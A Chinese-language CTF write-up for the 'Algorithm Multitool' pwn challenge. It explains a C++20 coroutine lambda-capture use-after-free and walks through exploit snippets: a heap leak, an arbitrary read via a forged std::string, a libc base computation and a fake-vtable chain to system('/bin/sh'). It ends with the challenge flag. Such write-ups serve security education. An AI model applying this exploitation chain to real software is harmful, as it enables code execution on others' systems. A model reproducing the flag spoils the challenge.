# Algorithm Multitool

## 题目简述

程序用 C++20 coroutine 保存并恢复算法任务。快速算法恢复一次后打印结果，慢速算法第一次恢复时计算、第二次恢复时打印。每个任务保存 coroutine handle、`Algo*`、名称和恢复次数，并放在 `std::vector<SavedTask*>` 中。

漏洞来自两个返回 coroutine 的工厂函数：

```cpp
auto fast_algo_factory(FastAlgo* algo) {
    algo->get_algo_params();
    algo->do_algo();
    auto h = [result = algo->get_result()]() -> Task {
        std::cout << "Result: " << result << std::endl;
        co_return;
    };
    return h;
}

auto slow_algo_factory(SlowAlgo* algo) {
    algo->get_algo_params();
    auto h = [algo_l = algo]() -> Task {
        co_await run_algo_async(algo_l);
        std::cout << "Result: " << algo_l->get_result() << std::endl;
        co_return;
    };
    return h;
}
```

捕获 lambda 自身是临时对象；调用它创建 coroutine 后，闭包即被销毁，但 coroutine 仍通过悬空的闭包对象访问 `result` 或 `algo_l`。这是 coroutine capture lifetime UAF，而不是算法实现中的普通数组越界。

## 解题过程

### 1. 利用非 SSO 字符串泄露堆地址

快速算法把结果字符串捕获进临时 lambda。长度不超过 15 的 libstdc++ 字符串通常使用 Small String Optimization，字符直接位于对象内部；更长的字符串则保存一个堆指针。

选择 GCD，并让结果为 19 位的 `9223372036854775807`。临时闭包销毁后，其字符串堆块被释放，但 coroutine 恢复时仍按原指针和长度打印该字符串。释放块开头已经被 tcache 元数据覆盖，因此 `Result: ` 后的前 8 字节泄露堆指针：

```python
create_gcd(0x7fffffffffffffff, 0x7fffffffffffffff)
resume(0)
io.recvuntil(b"Result: ")
heap_leak = u64(io.recv(8))
delete(0)
```

这里需要刻意避开 SSO；短数字只会读取已失效闭包的内联字符，不能得到预期的 freed-chunk 指针。

### 2. 把慢速任务的悬空捕获改造成任意读

慢速 coroutine 中的 `algo_l` 同样位于已经销毁的 lambda 闭包。后续创建任务时，主循环会复用相关栈槽；官方分析确认，该捕获最终把 `std::vector` 中保存任务指针的位置当成 `Algo*`。

接着通过多次创建和删除 `BubbleSort` 调整堆布局，并在其 `numbers` 数组中伪造一个 `std::string` 对象。64 位 libstdc++ 字符串的关键字段是数据指针与长度，因此将目标地址和 `0x10` 放到伪造 `result` 的对应位置：

```python
create_bubblesort(
    7,
    [0x4141414142424242] * 5
    + [heap_leak + 0x370, 0x10]
)
```

释放承载假对象的任务后，恢复最早的慢速任务。它执行：

```cpp
algo_l->get_result()
```

并把伪造字符串指针所指的 16 字节作为结果打印，从而得到任意地址读。第一次把目标设为堆上的 libc 指针，官方脚本以：

```python
libc.address = libc_leak - 0x219ce0
```

恢复题目所给 libc 的加载基址。

### 3. 覆盖悬空对象并构造 COP

继续增加任务会让 `std::vector` 扩容，旧的元素数组被释放。随后创建大尺寸快速算法，其 `numbers` 数组能够复用并覆盖这块旧存储。慢速 coroutine 仍持有指向旧区域的悬空对象引用，于是对象首部的虚表指针、虚调用所需数据和后续控制流都可由攻击者布置。

官方脚本使用一个长度为 `0x90` 的 `BinarySearch` 数组填充控制数据：

```python
do_system = libc.address + 0x508f2
bin_sh = libc.address + 0x1d8698
dispatch = libc.address + 0x94b36

create_binarysearch(
    0x90,
    [do_system, bin_sh] * 0x45 + [dispatch] * 6,
    0,
)
```

再用数个小数组稳定相邻布局，并把最终假对象指向泄露堆地址附近的受控区域。恢复受害慢速任务时，`run_algo_async` 对伪造的 `Algo*` 调用虚函数 `do_algo()`；受控虚表把执行流导入 libc 调度 gadget，再使用已布置的 `do_system` 与 `/bin/sh` 参数完成 coroutine-oriented programming，最终取得 shell。

仓库中的 flag 为：

```text
SEKAI{thanks_to_sahuang_and_raymond_chen_for_the_challenge_idea_0cbdaad426512d21c3a535096e039289}
```

## 方法总结

捕获 lambda 与 coroutine 组合时，闭包生命周期不会因为 coroutine 尚未结束而自动延长。本题先用快速任务中的悬空 `std::string` 和 SSO 分界泄露堆，再把慢速任务中的悬空对象指针升级为任意读，最后借 `std::vector` 扩容产生的 freed storage 覆盖假对象和虚表。利用中的堆偏移、libc 偏移及调度 gadget 均依赖官方 Ubuntu 22.04 构建，复现时必须使用题目附带二进制和 libc。
